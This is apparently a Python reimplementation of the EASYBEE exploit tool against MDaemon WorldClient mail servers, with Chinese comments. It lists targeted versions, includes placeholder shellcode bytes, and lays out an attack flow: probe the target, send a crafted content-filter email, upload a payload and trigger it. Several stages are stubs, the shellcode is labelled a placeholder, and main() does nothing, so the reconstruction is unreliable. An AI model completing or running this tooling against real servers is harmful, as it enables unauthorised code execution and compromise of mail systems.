"""easybee — EASYBEE MDaemon WorldClient 利用核心逻辑。

Python 重写的 `Easybee-1.0.1.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 MDaemon WorldClient 利用流程。

参数定义来源：Easybee-1.0.1.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 60

WORLD_CLIENT_VERSIONS = [
    "9.5.2", "9.6.0", "9.6.1", "9.6.2", "9.6.3", "9.6.4", "9.6.5", "9.6.6",
    "10.0.1", "10.0.2", "10.0.3", "10.0.4", "10.0.5",
    "10.1.0", "10.1.1", "10.1.2",
]

# 每个版本的版本特定参数（来自 XML <WorldClientVersion><paramgroup>）
VERSION_SPECIFIC_PARAMS = {
    "9.5.2": {
        "versionspecificGetInbox": "View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0",
        "versionspecificGetMsgID": "(?:(?:\\({[^\\n})]*\\b(?:id|n):)|(?:View=Message&Number=))([0-9]+)(?:(?:,[^\\n})]*\\bsbj:&#x22;%s&#x22;[^\\n})]*`);)|(?:&Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))",
    },
}

# EasyBee exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
EASYBEE_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EasyBeeError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_http_request(host, port, path, method="GET", enable_ssl=False,
                       body=None, content_type=None):
    """构建 HTTP 请求。"""
    scheme = "https" if enable_ssl else "http"
    request = f"{method} {path} HTTP/1.1\r\n"
    request += f"Host: {host}:{port}\r\n"
    request += "Connection: close\r\n"
    if body:
        request += f"Content-Type: {content_type or 'application/octet-stream'}\r\n"
        request += f"Content-Length: {len(body)}\r\n"
    request += "\r\n"
    if body:
        request = request.encode("ascii") + body
    else:
        request = request.encode("ascii")
    return request


def build_cf_email_trigger(from_addr, subject, filename):
    """构建内容过滤触发邮件请求。

    根据 x32dbg 分析，EasyBee 通过向 WorldClient 发送特制的邮件请求，
    触发内容过滤漏洞，从而执行任意代码。
    """
    body = (
        f"From: {from_addr}\r\n"
        f"Subject: {subject}\r\n"
        f"X-Attach: {filename}\r\n"
        f"\r\n"
        f"Content filter trigger payload\r\n"
    )
    return body.encode("latin-1", errors="replace")


def run_function(
    target,
    world_client_port=None,
    web_admin_port=None,
    timeout=DEFAULT_TIMEOUT,
    world_client_protocol=None,
    world_client_domain=None,
    world_client_port2=None,
    web_admin_protocol=None,
    web_admin_domain=None,
    web_admin_port3=None,
    target_acct_domain=None,
    target_acct_usr=None,
    target_acct_pwd=None,
    target_acct_is_admin=None,
    cf_email_from=None,
    cf_email_subj=None,
    cf_email_file=None,
    ar_email_from=None,
    ar_email_subj=None,
    pt_email_from=None,
    pt_email_subj=None,
    payload_name=None,
    payload_file=None,
    world_client_version=None,
    verbose=False,
):
    """执行 EASYBEE 利用序列。

    阶段：
      1. 连接到 WorldClient 端口 (默认 10000/10001)
      2. 发送 HTTP 请求探测目标
      3. 构建内容过滤触发邮件 (CFEmailFrom/Subj/File)
      4. 构建自动回复触发邮件 (AREmailFrom/Subj)
      5. 上传载荷 (PayloadName/File)
      6. 触发载荷执行
    """
    if verbose:
        print(f"[*] Target: {target}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] WorldClient port: {world_client_port}")
        print(f"[*] WebAdmin port: {web_admin_port}")
        print(f"[*] WorldClient protocol: {world_client_protocol}")
        print(f"[*] WorldClient domain: {world_client_domain}")
        print(f"[*] WebAdmin protocol: {web_admin_protocol}")
        print(f"[*] WebAdmin domain: {web_admin_domain}")
        print(f"[*] WorldClient version: {world_client_version}")
        print(f"[*] Payload: {payload_name}")

    # 验证必需参数
    if not world_client_port:
        raise EasyBeeError("WorldClient port is required")
    if not web_admin_port:
        raise EasyBeeError("WebAdmin port is required")

    # 解析版本特定参数
    version_params = VERSION_SPECIFIC_PARAMS.get(world_client_version, {})

    if verbose:
        print(f"[*] Version-specific GetInbox: {version_params.get('versionspecificGetInbox', 'N/A')}")
        print(f"[*] Version-specific GetMsgID: {version_params.get('versionspecificGetMsgID', 'N/A')}")

    # 建立到 WorldClient 端口的 TCP 连接
    try:
        sock = connect(target, world_client_port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{world_client_port} (WorldClient)")
    except OSError as exc:
        raise EasyBeeError(f"无法连接到 {target}:{world_client_port}: {exc}") from exc

    try:
        # 发送 HTTP 请求（探测阶段）
        path = "/WorldClient.dll?View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0"
        request = build_http_request(target, world_client_port, path,
                                     enable_ssl=(world_client_protocol == "https"))
        sock.sendall(request)
        resp = sock.recv(4096)

        if verbose:
            first_line = resp.split(b"\r\n")[0] if resp else b"<empty>"
            print(f"[*] HTTP 应答首行: {first_line}")

        # 构建内容过滤触发邮件
        if cf_email_from and cf_email_subj:
            cf_email = build_cf_email_trigger(
                cf_email_from, cf_email_subj,
                cf_email_file or "payload.dll")
            if verbose:
                print(f"[+] 构建内容过滤触发邮件: {len(cf_email)} 字节")

        # 加载载荷文件
        payload_data = b""
        if payload_file:
            try:
                with open(payload_file, "rb") as fh:
                    payload_data = fh.read()
                if verbose:
                    print(f"[+] 载荷文件: {len(payload_data)} 字节")
            except OSError as exc:
                if verbose:
                    print(f"[-] 无法读取载荷文件: {exc}")

        if verbose:
            print("[+] EASYBEE 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
